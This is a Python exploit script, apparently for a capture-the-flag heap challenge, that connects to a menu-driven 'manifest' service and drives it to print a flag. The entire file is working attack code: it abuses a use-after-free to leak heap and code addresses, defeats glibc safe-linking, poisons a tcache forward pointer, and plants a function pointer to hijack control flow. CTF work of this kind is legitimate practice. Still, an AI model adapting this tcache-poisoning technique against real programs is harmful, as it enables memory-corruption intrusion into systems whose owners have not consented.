#!/usr/bin/env python3
import re
import socket
import struct
import sys

HOST = sys.argv[1] if len(sys.argv) > 1 else "10.112.0.12"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 47045

s = socket.create_connection((HOST, PORT), timeout=8)
s.settimeout(8)
buf = bytearray()
transcript = bytearray()

def recvuntil(marker: bytes) -> bytes:
    global buf
    while marker not in buf:
        chunk = s.recv(4096)
        if not chunk:
            raise EOFError(f"connection closed waiting for {marker!r}; buffered={bytes(buf)!r}")
        buf.extend(chunk)
        transcript.extend(chunk)
    idx = buf.index(marker) + len(marker)
    out = bytes(buf[:idx])
    del buf[:idx]
    return out

def sendline(value):
    if isinstance(value, int):
        value = str(value).encode()
    elif isinstance(value, str):
        value = value.encode()
    s.sendall(value + b"\n")

def sendraw(data: bytes):
    s.sendall(data)

def prompt():
    return recvuntil(b"> ")

def create(slot: int, size: int, data: bytes):
    prompt(); sendline(1)
    recvuntil(b"Slot:\n"); sendline(slot)
    recvuntil(b"Manifest size:\n"); sendline(size)
    recvuntil(b"Manifest data:\n"); sendraw(data)
    return recvuntil(b"Docked.\n")

def release(slot: int):
    prompt(); sendline(4)
    recvuntil(b"Slot:\n"); sendline(slot)
    return recvuntil(b"Shipment released.\n")

def view(slot: int):
    prompt(); sendline(3)
    recvuntil(b"Slot:\n"); sendline(slot)
    return recvuntil(b"\n> ")

def edit_after_consumed_prompt(slot: int, data: bytes):
    sendline(2)
    recvuntil(b"Slot:\n"); sendline(slot)
    recvuntil(b"New manifest data:\n"); sendraw(data)
    return recvuntil(b"Updated.\n")

def replace(slot: int, data: bytes):
    prompt(); sendline(5)
    recvuntil(b"Slot:\n"); sendline(slot)
    recvuntil(b"Replacement manifest:\n"); sendraw(data)
    return recvuntil(b"Manifest replaced.\n")

create(0, 0x48, b"A" * 8)
create(1, 0x48, b"B" * 8)
release(0)
release(1)
leak = view(1)
print(leak.decode("latin-1", errors="replace"), end="")

stamp_m = re.search(rb"Receipt stamp: (0x[0-9a-fA-F]+)", leak)
ptr_m = re.search(rb"Manifest pointer: (0x[0-9a-fA-F]+)", leak)
next_m = re.search(rb"Encoded next: (0x[0-9a-fA-F]+)", leak)
if not (stamp_m and ptr_m and next_m):
    raise RuntimeError("failed to parse leaks")

standby = int(stamp_m.group(1), 16)
b_chunk = int(ptr_m.group(1), 16)
encoded_next = int(next_m.group(1), 16)
a_chunk = encoded_next ^ (b_chunk >> 12)
if a_chunk != b_chunk - 0x50:
    raise RuntimeError(f"unexpected heap layout: A={a_chunk:#x}, B={b_chunk:#x}")

print_flag = standby + 0x1f
harbor = b_chunk - 0xA0
poisoned_fd = harbor ^ (b_chunk >> 12)
print(f"[+] standby    = {standby:#x}")
print(f"[+] print_flag = {print_flag:#x}")
print(f"[+] A chunk    = {a_chunk:#x}")
print(f"[+] B chunk    = {b_chunk:#x}")
print(f"[+] harbor     = {harbor:#x}")

edit_after_consumed_prompt(1, struct.pack("<Q", poisoned_fd))
replace(1, b"R" * 8)
payload = b"X" * 32 + struct.pack("<Q", print_flag) + b"flag.txt\x00"
create(2, 0x48, payload)

prompt(); sendline(7)
final = bytearray()
while True:
    try:
        chunk = s.recv(4096)
    except socket.timeout:
        break
    if not chunk:
        break
    final.extend(chunk)
    transcript.extend(chunk)

text = final.decode("latin-1", errors="replace")
print(text, end="")
flag_m = re.search(r"Flag:\s*(grodno\{[^\r\n}]*\})", text)
if not flag_m:
    raise RuntimeError("no real flag appeared")
print(f"[+] VERIFIED_FLAG={flag_m.group(1)}")
with open("deep_port_transcript.bin", "wb") as f:
    f.write(transcript)
s.close()
